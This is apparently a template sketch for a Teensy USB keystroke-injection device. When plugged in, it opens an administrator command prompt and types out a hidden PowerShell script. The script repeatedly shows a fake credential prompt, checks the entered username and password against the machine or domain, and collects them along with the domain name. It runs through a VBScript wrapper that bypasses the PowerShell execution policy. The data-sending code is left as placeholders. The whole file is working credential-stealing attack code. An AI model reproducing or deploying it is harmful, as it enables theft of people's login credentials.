#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $ErrorActionPreference=\"SilentlyContinue\" > %temp%\\cr.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Credentials\" >> %temp%\\cr.ps1");
  Keyboard.println("echo Add-Type -assemblyname system.DirectoryServices.accountmanagement  >> %temp%\\cr.ps1");
  Keyboard.println("echo $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) >> %temp%\\cr.ps1");
  Keyboard.println("echo $dn = \"LDAP://\" + ([ADSI]\"\").distinguishedName >> %temp%\\cr.ps1");
  Keyboard.println("echo while(1){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $cr = $host.ui.PromptForCredential(\"Need credentials\", \"Please enter your user name and password.\", \"\", \"\") >> %temp%\\cr.ps1");
  Keyboard.println("echo if($cr){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $creds = $cr.GetNetworkCredential() >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$u = $creds.username >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$p = $creds.password >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$domain = $creds.domain >> %temp%\\cr.ps1");
  Keyboard.println("echo $al = $DS.ValidateCredentials($u, $p) >> %temp%\\cr.ps1");
  Keyboard.println("echo $ad = New-Object System.DirectoryServices.DirectoryEntry($dn,$u,$p) >> %temp%\\cr.ps1");
  Keyboard.println("echo if(($al -eq $true) -or ($ad.name -ne $null)){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $pv = \"Username: \" + $u + \" Password: \" + $p + \" Domain:\" + $domain >> %temp%\\cr.ps1");
  Keyboard.println("echo break}}} >> %temp%\\cr.ps1");


  String fn = "cr";
  EXFILCALLS


  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\cr.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\cr.ps1\"),0,true >> %temp%\\cr.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\cr.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}
  DEFS
  EXFILDEFS
